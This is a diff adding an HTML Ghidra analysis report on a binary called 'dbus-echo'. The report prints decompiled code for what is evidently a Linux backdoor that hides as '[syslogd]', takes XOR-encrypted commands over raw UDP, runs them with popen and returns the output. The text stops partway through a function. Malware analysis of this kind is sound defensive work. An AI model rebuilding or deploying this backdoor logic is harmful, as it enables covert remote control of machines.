@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghidra Analysis Report - dbus-echo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root { --agent-color: #1a73e8; --primary: #1f2937; --border: #e5e7eb; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f3f4f6; color: #111827; }
+        .page-container { max-width: 1100px; margin: 20px auto; background: white; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); padding: 32px 40px; }
+        .mono { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; }
+        .agent-badge { display: inline-block; background: var(--agent-color); color: white; padding: 4px 16px; border-radius: 4px; font-weight: 700; font-size: 14px; letter-spacing: 0.05em; text-transform: uppercase; }
+        h1 { font-size: 26px; font-weight: 700; color: var(--primary); margin: 0 0 4px 0; }
+        h2.section-header { font-size: 14pt; font-weight: 700; text-transform: uppercase; color: var(--primary); border-bottom: 2px solid var(--agent-color); padding-bottom: 6px; margin-top: 36px; margin-bottom: 16px; }
+        .meta-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: #f9fafb; border: 1px solid #d1d5db; padding: 14px; margin-bottom: 24px; font-size: 0.9rem; }
+        .meta-label { font-weight: 600; color: #4b5563; text-transform: uppercase; font-size: 0.7rem; }
+        table.data-table { width: 100%; border-collapse: collapse; margin: 12px 0 24px 0; font-size: 0.88rem; }
+        table.data-table th { background: #e5e7eb; font-weight: 700; text-transform: uppercase; font-size: 0.72rem; color: #374151; padding: 8px 10px; text-align: left; border-bottom: 2px solid #9ca3af; }
+        table.data-table td { padding: 6px 10px; border-bottom: 1px solid #e5e7eb; }
+        table.data-table td.prop { font-weight: 600; color: #4b5563; width: 180px; white-space: nowrap; }
+        table.data-table tr:hover { background: #f9fafb; }
+        .decomp-block { margin-bottom: 20px; border: 1px solid #d1d5db; border-radius: 4px; overflow: hidden; }
+        .decomp-header { background: var(--agent-color); color: white; padding: 8px 14px; font-family: 'Roboto Mono', monospace; font-size: 0.85rem; font-weight: 500; }
+        .decomp-block pre { margin: 0; padding: 14px; background: #f8f9fa; overflow-x: auto; font-size: 0.82rem; line-height: 1.5; }
+        .decomp-block code { font-family: 'Roboto Mono', monospace; color: #1f2937; }
+        .summary-box { background: #f9fafb; border: 1px solid #d1d5db; padding: 20px; border-radius: 4px; margin-top: 8px; }
+        .summary-box p { margin-bottom: 10px; line-height: 1.6; font-size: 10.5pt; }
+        .summary-box ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 10px; }
+        .summary-box li { margin-bottom: 5px; }
+        .summary-box pre { background: #f3f4f6; border: 1px solid #d1d5db; border-left: 4px solid #6b7280; padding: 12px; overflow-x: auto; font-size: 0.82rem; margin: 14px 0; }
+        .summary-box code { font-family: 'Roboto Mono', monospace; background: #f3f4f6; padding: 2px 4px; font-size: 0.88em; color: #b91c1c; }
+        .summary-box pre code { color: #374151; background: none; padding: 0; }
+        .summary-box h3 { font-size: 1.05rem; font-weight: 700; color: #1f2937; margin-top: 1.2rem; margin-bottom: 0.6rem; border-bottom: 1px dotted #d1d5db; padding-bottom: 4px; }
+        .summary-box table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.88rem; border: 1px solid #d1d5db; }
+        .summary-box th { background: #e5e7eb; font-weight: 700; text-transform: uppercase; font-size: 0.72rem; padding: 8px 10px; text-align: left; border-bottom: 2px solid #9ca3af; }
+        .summary-box td { padding: 6px 10px; border-bottom: 1px solid #e5e7eb; }
+        .stat { display: inline-block; background: #f3f4f6; border: 1px solid #d1d5db; padding: 12px 20px; border-radius: 4px; text-align: center; margin: 6px; }
+        .stat .num { font-size: 28px; font-weight: 700; color: var(--agent-color); }
+        .stat .lbl { font-size: 0.72rem; color: #6b7280; text-transform: uppercase; font-weight: 600; }
+        .no-print { }
+        @media print { body { background: white; } .page-container { margin: 0; box-shadow: none; } .no-print { display: none !important; } }
+    </style>
+</head>
+<body>
+    <div class="no-print" style="position: fixed; bottom: 32px; right: 32px; z-index: 50;">
+        <button onclick="window.print()" style="background: var(--agent-color); color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: 600; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Print / Save PDF</button>
+    </div>
+
+    <div class="page-container">
+        <!-- Header -->
+        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--agent-color); padding-bottom: 16px; margin-bottom: 20px;">
+            <div>
+                <div style="margin-bottom: 8px;"><span class="agent-badge">Ghidra</span></div>
+                <h1>Agent Analysis Report</h1>
+                <div style="font-size: 13px; color: #6b7280;">Per-tool findings for binary <span class="mono">dbus-echo</span></div>
+            </div>
+            <div style="text-align: right; font-size: 13px; color: #6b7280;">
+                <div>2026-02-10 09:10 UTC</div>
+                <div class="mono">Session: c78c2a2e</div>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div style="text-align: center; margin-bottom: 24px;">
+            <div class="stat"><div class="num">70</div><div class="lbl">Functions Found</div></div>
+            <div class="stat"><div class="num">12</div><div class="lbl">Decompiled</div></div>
+            <div class="stat"><div class="num">153</div><div class="lbl">Strings</div></div>
+        </div>
+
+        <!-- Binary Information -->
+        <h2 class="section-header">Binary Information</h2>
+        <table class="data-table">
+            <tbody>
+                <tr><td class="prop">SHA-256</td><td class="mono" style="word-break:break-all">827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161</td></tr>
+                
+        <tr><td class="prop">Architecture</td><td>x86</td></tr>
+        <tr><td class="prop">Image Base</td><td class="mono">00400000</td></tr>
+        <tr><td class="prop">Compiler</td><td>ghidra.program.database.ProgramCompilerSpec@6f12fca0</td></tr>
+        <tr><td class="prop">Entry Points</td><td class="mono" style="word-break:break-all">00601dc8, 004017a0, 00400aa0, 00401878, 00401216, 00401888, 0040163e, 00401890, 00601b38, 004017b0</td></tr>
+        <tr><td class="prop">Imports</td><td class="mono" style="word-break:break-all">&lt;EXTERNAL&gt;::__sysv_signal, &lt;EXTERNAL&gt;::printf, &lt;EXTERNAL&gt;::memset, &lt;EXTERNAL&gt;::puts, &lt;EXTERNAL&gt;::fseek, &lt;EXTERNAL&gt;::htons, &lt;EXTERNAL&gt;::exit, &lt;EXTERNAL&gt;::fopen, &lt;EXTERNAL&gt;::__libc_start_main, &lt;EXTERNAL&gt;::recv, &lt;EXTERNAL&gt;::setsockopt, &lt;EXTERNAL&gt;::pclose, &lt;EXTERNAL&gt;::sprintf, &lt;EXTERNAL&gt;::ntohs, &lt;EXTERNAL&gt;::fgetc, &lt;EXTERNAL&gt;::strerror, &lt;EXTERNAL&gt;::memcpy, &lt;EXTERNAL&gt;::socket, &lt;EXTERNAL&gt;::__errno_location, &lt;EXTERNAL&gt;::strcpy</td></tr>
+        <tr><td class="prop">Exports</td><td class="mono" style="word-break:break-all">data_start, __libc_csu_fini, _start, _fini, sendResult2Peer, _IO_stdin_used, checksum, __dso_handle, __DTOR_END__, __libc_csu_init, initPz, myDecryptFun, __bss_start, file, remoteExec, _end, myEncryptFun, filesize, udp_tcp_checksum, main</td></tr>
+        <tr><td class="prop">Segments</td><td>31</td></tr>
+        <tr><td class="prop">Functions Discovered</td><td>70</td></tr>
+        <tr><td class="prop">Functions Decompiled</td><td>12</td></tr>
+            </tbody>
+        </table>
+
+        <!-- Functions -->
+        <h2 class="section-header">Functions (70 discovered)</h2>
+        <table class="data-table">
+            <thead><tr><th>Name</th><th>Address</th><th>Size</th><th>XRefs</th><th>Decompiled</th></tr></thead>
+            <tbody><tr><td class="mono">_init</td><td class="mono">004008d0</td><td>24</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">FUN_004008e8</td><td class="mono">004008e8</td><td>12</td><td>26</td><td>Yes</td></tr>
+<tr><td class="mono">__sysv_signal</td><td class="mono">004008f8</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">printf</td><td class="mono">00400908</td><td>6</td><td>6</td><td>No</td></tr>
+<tr><td class="mono">memset</td><td class="mono">00400918</td><td>6</td><td>5</td><td>No</td></tr>
+<tr><td class="mono">puts</td><td class="mono">00400928</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fseek</td><td class="mono">00400938</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">htons</td><td class="mono">00400948</td><td>6</td><td>6</td><td>No</td></tr>
+<tr><td class="mono">exit</td><td class="mono">00400958</td><td>6</td><td>2</td><td>No</td></tr>
+<tr><td class="mono">fopen</td><td class="mono">00400968</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__libc_start_main</td><td class="mono">00400978</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">recv</td><td class="mono">00400988</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">setsockopt</td><td class="mono">00400998</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">pclose</td><td class="mono">004009a8</td><td>6</td><td>2</td><td>No</td></tr>
+<tr><td class="mono">sprintf</td><td class="mono">004009b8</td><td>6</td><td>2</td><td>No</td></tr>
+<tr><td class="mono">ntohs</td><td class="mono">004009c8</td><td>6</td><td>2</td><td>No</td></tr>
+<tr><td class="mono">fgetc</td><td class="mono">004009d8</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">strerror</td><td class="mono">004009e8</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">memcpy</td><td class="mono">004009f8</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">socket</td><td class="mono">00400a08</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__errno_location</td><td class="mono">00400a18</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">strcpy</td><td class="mono">00400a28</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fclose</td><td class="mono">00400a38</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fork</td><td class="mono">00400a48</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">sendto</td><td class="mono">00400a58</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fwrite</td><td class="mono">00400a68</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">perror</td><td class="mono">00400a78</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">popen</td><td class="mono">00400a88</td><td>6</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">_start</td><td class="mono">00400aa0</td><td>42</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">call_gmon_start</td><td class="mono">00400acc</td><td>23</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__do_global_dtors_aux</td><td class="mono">00400af0</td><td>93</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">frame_dummy</td><td class="mono">00400b50</td><td>38</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">main</td><td class="mono">00400b78</td><td>1366</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">remoteExec</td><td class="mono">004010ce</td><td>328</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">sendResult2Peer</td><td class="mono">00401216</td><td>840</td><td>3</td><td>Yes</td></tr>
+<tr><td class="mono">myEncryptFun</td><td class="mono">0040155e</td><td>112</td><td>2</td><td>Yes</td></tr>
+<tr><td class="mono">myDecryptFun</td><td class="mono">004015ce</td><td>112</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">checksum</td><td class="mono">0040163e</td><td>122</td><td>2</td><td>Yes</td></tr>
+<tr><td class="mono">udp_tcp_checksum</td><td class="mono">004016b8</td><td>224</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">__libc_csu_fini</td><td class="mono">004017a0</td><td>2</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">__libc_csu_init</td><td class="mono">004017b0</td><td>139</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">__do_global_ctors_aux</td><td class="mono">00401840</td><td>54</td><td>1</td><td>Yes</td></tr>
+<tr><td class="mono">_fini</td><td class="mono">00401878</td><td>14</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">__sysv_signal</td><td class="mono">00602000</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">printf</td><td class="mono">00602008</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">memset</td><td class="mono">00602010</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__gmon_start__</td><td class="mono">00602018</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">puts</td><td class="mono">00602020</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fseek</td><td class="mono">00602028</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">htons</td><td class="mono">00602030</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">exit</td><td class="mono">00602038</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fopen</td><td class="mono">00602040</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__libc_start_main</td><td class="mono">00602048</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">recv</td><td class="mono">00602050</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">setsockopt</td><td class="mono">00602058</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">pclose</td><td class="mono">00602060</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">sprintf</td><td class="mono">00602068</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">ntohs</td><td class="mono">00602070</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fgetc</td><td class="mono">00602078</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">strerror</td><td class="mono">00602080</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">memcpy</td><td class="mono">00602088</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">socket</td><td class="mono">00602090</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">__errno_location</td><td class="mono">00602098</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">strcpy</td><td class="mono">006020a0</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fclose</td><td class="mono">006020a8</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fork</td><td class="mono">006020b0</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">sendto</td><td class="mono">006020b8</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">fwrite</td><td class="mono">006020c0</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">perror</td><td class="mono">006020c8</td><td>1</td><td>1</td><td>No</td></tr>
+<tr><td class="mono">popen</td><td class="mono">006020d0</td><td>1</td><td>1</td><td>No</td></tr>
+</tbody>
+        </table>
+
+        <!-- Decompiled Code -->
+        <h2 class="section-header">Decompiled Code (12 functions)</h2>
+        
+        <div class="decomp-block">
+            <div class="decomp-header">FUN_004008e8</div>
+            <pre><code>
+void FUN_004008e8(void)
+
+{
+  (*(code *)PTR_00601cf0)();
+  return;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">main</div>
+            <pre><code>
+void main(undefined8 param_1,undefined8 *param_2)
+
+{
+  char cVar1;
+  undefined4 *puVar2;
+  uint16_t uVar3;
+  int iVar4;
+  __pid_t _Var5;
+  int *piVar6;
+  char *pcVar7;
+  ssize_t sVar8;
+  long lVar9;
+  ulong uVar10;
+  undefined1 *puVar11;
+  char local_e38 [1512];
+  uint local_850;
+  undefined4 local_84c;
+  char local_848 [5];
+  uint uStack_843;
+  byte bStack_83f;
+  ushort auStack_83e [5];
+  undefined1 auStack_834 [2];
+  uint16_t local_832;
+  int local_40;
+  uint local_3c;
+  char *local_38;
+  int local_2c;
+  undefined1 *local_28;
+  char *local_20;
+  char *local_18;
+  undefined2 local_e;
+  uint local_c;
+  
+  local_40 = 0xffffffff;
+  memset(local_848,0,0x800);
+  uVar10 = 0xffffffffffffffff;
+  pcVar7 = (char *)*param_2;
+  do {
+    if (uVar10 == 0) break;
+    uVar10 = uVar10 - 1;
+    cVar1 = *pcVar7;
+    pcVar7 = pcVar7 + 1;
+  } while (cVar1 != &#x27;\0&#x27;);
+  if (8 &lt; ~uVar10 - 1) {
+    uVar10 = 0xffffffffffffffff;
+    pcVar7 = (char *)*param_2;
+    do {
+      if (uVar10 == 0) break;
+      uVar10 = uVar10 - 1;
+      cVar1 = *pcVar7;
+      pcVar7 = pcVar7 + 1;
+    } while (cVar1 != &#x27;\0&#x27;);
+    uVar10 = ~uVar10;
+    puVar11 = (undefined1 *)*param_2;
+    while (uVar10 = uVar10 - 1, uVar10 != 0) {
+      *puVar11 = 0;
+      puVar11 = puVar11 + 1;
+    }
+    puVar2 = (undefined4 *)*param_2;
+    *puVar2 = 0x7379735b;
+    puVar2[1] = 0x64676f6c;
+    *(undefined2 *)(puVar2 + 2) = 0x5d;
+  }
+  __sysv_signal(0x11,(__sighandler_t)0x1);
+  local_40 = socket(2,3,0x11);
+  if (local_40 == -1) {
+    piVar6 = __errno_location();
+    pcVar7 = strerror(*piVar6);
+    printf(&quot;socket(): %s\n&quot;,pcVar7);
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  local_84c = 1;
+  iVar4 = setsockopt(local_40,0,3,&amp;local_84c,4);
+  if (iVar4 &lt; 0) {
+    puts(&quot;setsockopt error!&quot;);
+  }
+LAB_00400cd7:
+  do {
+    while( true ) {
+      do {
+        do {
+          do {
+            memset(local_848,0,0x800);
+            sVar8 = recv(local_40,local_848,0x800,0);
+            local_3c = (uint)sVar8;
+          } while ((int)local_3c &lt; 1);
+          local_38 = local_848;
+          local_2c = 0x14;
+          local_28 = auStack_834;
+          uVar3 = ntohs(local_832);
+        } while (uVar3 != 0x84b);
+        iVar4 = local_2c + 8;
+        local_20 = local_848 + iVar4;
+        local_2c = local_2c + 0x14;
+      } while (local_848[(long)iVar4 + 1] != &#x27;\x01&#x27;);
+      lVar9 = (long)local_2c;
+      local_18 = local_848 + lVar9;
+      local_850 = *(uint *)((long)&amp;uStack_843 + lVar9);
+      if (local_850 == idkey) break;
+      printf(&quot;idkey not correct,%d!=%d\n&quot;,(ulong)local_850,(ulong)idkey);
+    }
+    printf(&quot;receive %d, cmd type is %d and cmdl is %d\n&quot;,(ulong)local_3c,(ulong)(&amp;bStack_83f)[lVar9]
+           ,(ulong)*(ushort *)((long)auStack_83e + lVar9));
+    myDecryptFun(&amp;idkey,4,local_18 + 0xc,*(undefined2 *)(local_18 + 10),local_18 + 0xc);
+    if (local_18[9] != &#x27;\0&#x27;) {
+      if (local_18[9] == &#x27;\x01&#x27;) {
+        idkey = *(uint *)(local_18 + 0xc);
+        pcVar7 = local_e38;
+        for (lVar9 = 0x32; lVar9 != 0; lVar9 = lVar9 + -1) {
+          *pcVar7 = &#x27;\0&#x27;;
+          pcVar7 = pcVar7 + 1;
+        }
+        lVar9 = -1;
+        pcVar7 = local_e38;
+        do {
+          if (lVar9 == 0) break;
+          lVar9 = lVar9 + -1;
+          cVar1 = *pcVar7;
+          pcVar7 = pcVar7 + 1;
+        } while (cVar1 != &#x27;\0&#x27;);
+        sendResult2Peer(local_40,local_848,local_3c &amp; 0xffff,local_e38,~(ushort)lVar9 - 1);
+        goto LAB_00400cd7;
+      }
+      if (local_18[9] == &#x27;\x02&#x27;) {
+        if (file == (FILE *)0x0) {
+          file = fopen(&quot;system.conf&quot;,&quot;w+&quot;);
+          fseek(file,0,0);
+        }
+        fwrite(local_18 + 0xc,1,(ulong)*(ushort *)(local_18 + 10),file);
+        filesize = *(ushort *)(local_18 + 10) + filesize;
+        if (*(short *)(local_18 + 10) != initPz) {
+          fclose(file);
+          file = (FILE *)0x0;
+          pcVar7 = local_e38;
+          for (lVar9 = 0x32; lVar9 != 0; lVar9 = lVar9 + -1) {
+            *pcVar7 = &#x27;\0&#x27;;
+            pcVar7 = pcVar7 + 1;
+          }
+          sprintf(local_e38,&quot;%d file data is received\n&quot;,(ulong)filesize);
+          printf(&quot;%s&quot;,local_e38);
+          lVar9 = -1;
+          pcVar7 = local_e38;
+          do {
+            if (lVar9 == 0) break;
+            lVar9 = lVar9 + -1;
+            cVar1 = *pcVar7;
+            pcVar7 = pcVar7 + 1;
+          } while (cVar1 != &#x27;\0&#x27;);
+          sendResult2Peer(local_40,local_848,local_3c &amp; 0xffff,local_e38,~(ushort)lVar9 - 1);
+          filesize = 0;
+        }
+        goto LAB_00400cd7;
+      }
+    }
+    _Var5 = fork();
+    if (_Var5 == 0) {
+      memset(local_e38,0,0x5dc);
+      local_e = remoteExec(local_18 + 0xc,local_e38);
+      printf(&quot;excute result is %s\n&quot;,local_e38);
+      local_c = sendResult2Peer(local_40,local_848,local_3c &amp; 0xffff,local_e38,local_e);
+      printf(&quot;send %d\n&quot;,(ulong)local_c);
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+  } while( true );
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sendResult2Peer</div>
+            <pre><code>
+void sendResult2Peer(int param_1,undefined1 *param_2,ushort param_3,undefined8 param_4,
+                    ushort param_5)
+
+{
+  uint16_t uVar1;
+  undefined2 uVar2;
+  long lVar3;
+  ulong uVar4;
+  undefined1 *puVar5;
+  sockaddr local_638;
+  undefined1 local_628 [2];
+  undefined2 local_626 [5];
+  undefined4 local_61c;
+  undefined4 local_618;
+  int local_44;
+  undefined1 *local_40;
+  undefined2 *local_30;
+  undefined2 local_22;
+  undefined1 *local_20;
+  undefined1 *local_18;
+  uint16_t local_a;
+  
+  memset(local_628,0,0x5dc);
+  local_44 = 0;
+  if (param_3 &lt; 0x5dc) {
+    puVar5 = local_628;
+    for (uVar4 = (ulong)param_3; uVar4 != 0; uVar4 = uVar4 - 1) {
+      *puVar5 = *param_2;
+      param_2 = param_2 + 1;
+      puVar5 = puVar5 + 1;
+    }
+  }
+  else {
+    memcpy(local_628,param_2,0x5dc);
+  }
+  local_40 = local_628;
+  local_61c = local_618;
+  lVar3 = (long)(local_44 + 0x14);
+  local_30 = (undefined2 *)(local_628 + lVar3);
+  local_44 = local_44 + 0x1c;
+  local_22 = *(undefined2 *)(local_628 + lVar3 + 2);
+  *(undefined2 *)(local_628 + lVar3 + 2) = *local_30;
+  *local_30 = local_22;
+  local_20 = local_628 + local_44;
+  local_628[(long)local_44 + 1] = 2;
+  local_44 = local_44 + 0xc;
+  local_18 = local_628 + local_44;
+  *(undefined2 *)(local_628 + (long)local_44 + 1) = 2;
+  if (param_5 &lt; 0x4b0) {
+    myEncryptFun(&amp;idkey,4,param_4,param_5,local_18 + 0xc);
+    uVar1 = htons(param_5 + 0x20);
+    local_30[2] = uVar1;
+    *(ushort *)(local_18 + 10) = param_5;
+  }
+  else {
+    myEncryptFun(&amp;idkey,4,param_4,0x4b0,local_18 + 0xc);
+    uVar1 = htons(0x4d0);
+    local_30[2] = uVar1;
+    *(undefined2 *)(local_18 + 10) = 0x4b0;
+  }
+  uVar1 = htons(*(short *)(local_18 + 10) + 0x10);
+  *(uint16_t *)(local_20 + 2) = uVar1;
+  *(short *)(local_18 + 1) = *(short *)(local_18 + 1) + *(short *)(local_18 + 10) + 7;
+  uVar1 = htons(*(uint16_t *)(local_18 + 1));
+  *(uint16_t *)(local_18 + 1) = uVar1;
+  local_a = ntohs(local_30[2]);
+  local_30[3] = 0;
+  uVar2 = udp_tcp_checksum(0x11,*(undefined4 *)(local_40 + 0xc),*(undefined4 *)(local_40 + 0x10),
+                           local_30,local_a);
+  local_30[3] = uVar2;
+  local_40[6] = local_40[6] | 0x40;
+  uVar1 = htons(local_a + 0x14);
+  *(uint16_t *)(local_40 + 2) = uVar1;
+  *(undefined2 *)(local_40 + 10) = 0;
+  uVar2 = checksum(local_628,local_a + 0x14);
+  *(undefined2 *)(local_40 + 10) = uVar2;
+  local_638.sa_data._2_4_ = *(undefined4 *)(local_40 + 0x10);
+  local_638.sa_family = 2;
+  local_638.sa_data._0_2_ = local_30[1];
+  sendto(param_1,local_628,(ulong)local_a + 0x14,0,&amp;local_638,0x10);
+  return;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">remoteExec</div>
+            <pre><code>
+ushort remoteExec(char *param_1,char *param_2)
+
+{
+  char cVar1;
+  int iVar2;
+  char *pcVar3;
+  FILE *pFVar4;
+  ulong uVar5;
+  long lVar6;
+  ushort local_c;
+  
+  strcpy(param_2,param_1);
+  uVar5 = 0xffffffffffffffff;
+  pcVar3 = param_2;
+  do {
+    if (uVar5 == 0) break;
+    uVar5 = uVar5 - 1;
+    cVar1 = *pcVar3;
+    pcVar3 = pcVar3 + 1;
+  } while (cVar1 != &#x27;\0&#x27;);
+  pcVar3 = param_2 + (~uVar5 - 1);
+  pcVar3[0] = &#x27;\n&#x27;;
+  pcVar3[1] = &#x27; &#x27;;
+  pcVar3[2] = &#x27;\0&#x27;;
+  lVar6 = -1;
+  pcVar3 = param_2;
+  do {
+    if (lVar6 == 0) break;
+    lVar6 = lVar6 + -1;
+    cVar1 = *pcVar3;
+    pcVar3 = pcVar3 + 1;
+  } while (cVar1 != &#x27;\0&#x27;);
+  local_c = ~(ushort)lVar6 - 1;
+  pFVar4 = popen(param_1,&quot;r&quot;);
+  pFVar4 = (FILE *)(long)(int)pFVar4;
+  if (pFVar4 == (FILE *)0x0) {
+    perror(param_1);
+    pclose((FILE *)0x0);
+    sprintf(param_2 + local_c,&quot;server error: \&#x27;%s\&#x27; cannt execute\n&quot;,param_1);
+    lVar6 = -1;
+    do {
+      if (lVar6 == 0) break;
+      lVar6 = lVar6 + -1;
+      cVar1 = *param_2;
+      param_2 = param_2 + 1;
+    } while (cVar1 != &#x27;\0&#x27;);
+    local_c = ~(ushort)lVar6 - 1;
+  }
+  else {
+    for (; local_c &lt; 0x4b0; local_c = local_c + 1) {
+      iVar2 = fgetc(pFVar4);
+      if ((char)iVar2 == -1) break;
+      param_2[local_c] = (char)iVar2;
+    }
+    pclose(pFVar4);
+  }
+  return local_c;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">udp_tcp_checksum</div>
+            <pre><code>
+undefined2
+udp_tcp_checksum(undefined1 param_1,undefined4 param_2,undefined4 param_3,undefined1 *param_4,
+                uint16_t param_5)
+
+{
+  undefined2 uVar1;
+  ulong uVar2;
+  undefined4 *puVar3;
+  undefined1 *puVar4;
+  undefined1 local_608 [1504];
+  undefined4 local_28;
+  undefined4 local_24;
+  undefined1 local_20;
+  undefined1 local_1f;
+  uint16_t local_1e;
+  ushort local_e;
+  int local_c;
+  
+  local_e = 0xc;
+  local_20 = 0;
+  local_28 = param_3;
+  local_24 = param_2;
+  local_1f = param_1;
+  local_1e = htons(param_5);
+  local_c = (uint)local_e + (uint)param_5;
+  memset(local_608,0,0x5dc);
+  puVar3 = &amp;local_28;
+  puVar4 = local_608;
+  for (uVar2 = (ulong)local_e; uVar2 != 0; uVar2 = uVar2 - 1) {
+    *puVar4 = *(undefined1 *)puVar3;
+    puVar3 = (undefined4 *)((long)puVar3 + 1);
+    puVar4 = puVar4 + 1;
+  }
+  puVar4 = local_608 + local_e;
+  for (uVar2 = (ulong)param_5; uVar2 != 0; uVar2 = uVar2 - 1) {
+    *puVar4 = *param_4;
+    param_4 = param_4 + 1;
+    puVar4 = puVar4 + 1;
+  }
+  uVar1 = checksum(local_608,local_c);
+  return uVar1;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">checksum</div>
+            <pre><code>
+uint checksum(ushort *param_1,int param_2)
+
+{
+  long lVar1;
+  int local_24;
+  ushort *local_20;
+  ulong local_10;
+  
+  local_10 = 0;
+  local_20 = param_1;
+  for (local_24 = param_2; 1 &lt; local_24; local_24 = local_24 + -2) {
+    local_10 = local_10 + *local_20;
+    local_20 = local_20 + 1;
+  }
+  if (local_24 != 0) {
+    local_10 = local_10 + (byte)*local_20;
+  }
+  lVar1 = (local_10 &gt;&gt; 0x10) + (local_10 &amp; 0xffff);
+  return ~((int)lVar1 + (int)((ulong)lVar1 &gt;&gt; 0x10)) &amp; 0xffff;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">myEncryptFun</div>
+            <pre><code>
+ushort myEncryptFun(long param_1,byte param_2,long param_3,ushort param_4,long param_5)
+
+{
+  undefined1 local_d;
+  undefined4 local_c;
+  
+  local_d = 0;
+  for (local_c = 0; local_c &lt; (int)(uint)param_4; local_c = local_c + 1) {
+    if (param_2 &lt;= local_d) {
+      local_d = 0;
+    }
+    *(byte *)(local_c + param_5) =
+         *(byte *)(local_c + param_3) ^ *(byte *)((ulong)local_d + param_1);
+    local_d = local_d + 1;
+  }
+  return param_4;
+}
+
+</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">myDecryptFun</div>
+            <pre><code>
+ushort myDecryptFun(long param_1,byte param_2,long param_3,ushort param_4,long param_5)
+
+{
+  undefined1 local_d;
+  undefined4 local_c;
+  
+  local_d = 0;
+  for (local_c = 0; local_c &lt; (int)(uint)param_4; local_c = local_c + 1) {
+    if (param_2 &lt;= local_d) {
+      local_d = 0;
+    }
+    *(byte *)(local_c + param_5) =
+         *(byte *)(local_c + param_3) ^ *(byte *)((ulong)local_d + param_1);
